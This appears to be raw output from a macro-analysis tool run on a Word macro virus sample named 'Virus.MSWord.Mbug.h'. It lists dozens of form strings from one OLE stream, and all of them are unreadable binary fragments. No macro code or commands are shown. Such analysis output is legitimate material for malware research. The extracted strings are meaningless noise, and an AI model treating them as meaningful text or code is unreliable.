1t_����������wosJ9RkVc{u~JBB')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9^RcJ9R))!)%93#)3.+)%9)!))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BB9BJJR^RcPZmZKU^RcJJRJJRN?V99J999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9B9BZKUkkNPT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)1)BJBJNPTiiqum�um�um��o�{u~{u~kkcZkBBR1)B991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!)1)B<.<B9JJBJ99J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B���ҧ�ҧ����ܴ�ܴ�ܴ����ҧ��������������mn�mn�������������mn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##X1-X19J'1YB9B9)9B9BB9B9)9999F-=999999=-13#)3.+3#)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)9)93#)=-1=-13#)3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[[����������xcsJ9Jxcsk^g991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!199)%93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))%9)!))%93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BB9BJJR^Rc^RcgZsJJRJJR99J9)9199!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9BBRZKUum�wos3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)99JJJZcZksemsx�um�um�wos�o�wosiiqJJR99J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9k^gum�k^gk^gk^gNPTNPTB9B999)!)')-)%9)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B���ܴ�ܴ�ҧ�������ܴ����ҧ�������ҧ��������������~�mn���BB9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B'1Y1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%9#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##X1-X'&DB9B9)9B9BB9BB9BB9B9)9999=-13#)3#))!))!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)1)B9)9F-=9999919)9F-=1!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!cRk���������gZsNPTxcsZKU999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%9B9B[ZlkVc[ZlJJRJJRBFF1)B991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3.DJBJ[Zlwos�o�ZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
299J^Rccckk^gsemwoskkum�um�kkZKUBBR199!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
![Zlwos{�{u~sx��o�iiqkkum�kkk^gXFm9991)B)%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%9)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9B���ҧ�������ҧ�ܴ���ɹ��ҧ�ҧ�������ҧ��������mneYV���skc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X'1Y'1Y'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BB9BB9BB9B9)9999=-13.+1)B)!))%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)1%11)B9)99999)9F-=JBBJBBJBBBB9=-1+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a[~�������~^RccZkwosZKU9)9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))%9)!))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%9J9RkVc{u~cck[ZlJBJ99J3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!)B9BJJRk^gum��wk^g')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%999JJJRcZkk^g�o�{u~um�kkum�kVcJBJ3.D3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9kk{�um��o�um�{u~{��o���wos�o�wos�o�iiqBMkXFm99{1)B)%9)%9)!))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!<.<������ܴ�ܴ�ܴ�ҧ�������ҧ�ҧ����ҧ����ҧ����eYVsZc{^c!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9'1Y19J3=T1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1-X'1Y19c19J1)B99JB9BB9B9)99999993#)9)9)!))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)9)91%1F-=999F-=BB9JBBJBBJBBJBBLDD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)XFm�������o|ZKUwosxcskVcB9B3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%93.+3.+)!))!)1)B1)B[Zlsemum�JJR99J1)B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3.+J9RNPTk^gsem�o���B9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)99J[Zlcckiiqwosum�kk{u~iiqJJRJ9R3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)kk{��o�wossx��o�wos��sx�������sx�sx�t_�N]�ƨ�ƨ杊�dt�XFm99J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)9�~ҧ�ҧ�ҧ�ҧ�ҧ�������ҧ�ҧ����������ҧ�ҧ����sZc!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1'1Y'1Y9Fc)Bo1-X'1Y1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)Bo19c'1Y'1Y1)B19J9)9B9B9)99999)93.+)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)9)91%1J999)9F-=999J99RBB<<?JBBLDD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)B=k���������wos��um�semJJR<.<)%9)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)..93#)1)B1)B99Jk^gsemJJR<.<)%9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)')-1)B9)9B9JJJR^RccZksemum���JJR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)9)9B9Jiiqiiqum�um�kksem{�k^gJBJ9)9')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9B{�um�{u~kk{u~sx��o��������o���{�sx�[[�N]����µ����µ����ew�GF�1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)wos���ҧ�ҧ�ҧ����������ҧ����ҧ����������ҧ�ҧ�RBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)Bo9Fc4En)Bo19J'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91-X!1k9Fc1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^1-X19J1)B9999999991)B3#)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21%11)B1%1=-1F-=999J99F-=F-=J99JBBLDD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!19c�������~��~����o�k^g[ZlB9BJJR999)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%91993.+')-999JBJ^RcJJROGG999)%93.+)!))%93#)999B9BJBBNPT^RcJJRJJZJJR[Zliiqwosxcs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)1)BJJZgZssemkk{u~um�um�um�RBB<.<991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!^Rcwoswost_�{u~iiqum�{u~�o�um�{����o�wos�o�9L�iu͵�㵡�µ����µ�µ�µ蔠�{{�Xe�B/V1)B)%9)%9�mnҧ�ҧ����������������ҧ�ҧ�ҧ����ҧ�ҧ�ҧ����1!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)'1Y9Fc1-X)5k4En5:k4En!1k1-X'1Y'1Y'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X)5k)Bo1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X'1Y99J)%9#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1%1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B1%1=-19)9F-=9)9991J99B9BJBB?/3���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B/V�������������~��~�o|kVck^gk^gZKUJBBB9B3.+)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)3#)..9199999B9JJJZZKUJ9RB9BB9JB9B99JB9B>FXJJZJJZJ9RB9J1)B<.<3#)3.+[Zlk^gwos991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)BJJRiiqxcsum�sx�um�k^g[Zl1991)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99Jiiqum�um�wosum��o�um�sx��o�wos{�sx�{u~sx�a[~+)����̹�ƨ����µ赯ⵡ㣟ൡ�µ�ƨ�µ赡㝊�]i�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=xcs���ҧ�������������������������ҧ�ҧ����ҧ�ҧ�OGG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9Fc)Bo4En5:k4En4En4En)5k3=T'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J'1Y99{3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)3#)3#)<.<B9BF-=9919)99)9J99BB9DD;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�������������~��~�o|[Zl���mnkVc^RcJJRNPTJBJBB91999)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)9919991)BB9B99JJJRJJRJJRJJRJBBB9JJJRB9BB9B3#))!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJJRiiqB9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9B9B[Zlkkum�um�{u~wosgZsB9B1)B))!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)kVct_�wos{u~um�{�kkwos{���sx���{�sx�um�99{xw�ƨ浯�µ�µ�̹䵡㙍ۣ�ൡ�µ�µ�µ�µ�µ�~��#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=LHk�o�wos�~���������������������ҧ����ҧ�ҧ�ҧ�RBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!'1Y%)o4En5:kBMk9I�4En4En5:k)5k!1k'1Y1-X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N19c)Bo1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)=-1=-19)9F-=F-=F-=BB99)9F-=;+;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�������������~���k^gcccxcskVcNPTRBJJ9RJBJB9JB9B999199)%93#)1999913#))!))%9')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-)%9..91)B<.<9)999JJBB99JJ9R9)93.+)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
29)9JJRiiqB9J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!)JBJ[Zlsemkkum�kkum�ZKU9)9..9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBRwos{�kkum�kkum�sx�sx�{��o��o��wsx�{�ai~&-�{{�ƨ浡�µ虍�̹䔠ޙ��ƨ�µ�޸�µ�µ赡����}��$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2N?VcRk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=B=kt_�������ҧ����������ҧ�ҧ�������JBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9'1Y)Bo19c4En4EnBMk5:k4En4En19J3=T'1Y'1Y'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
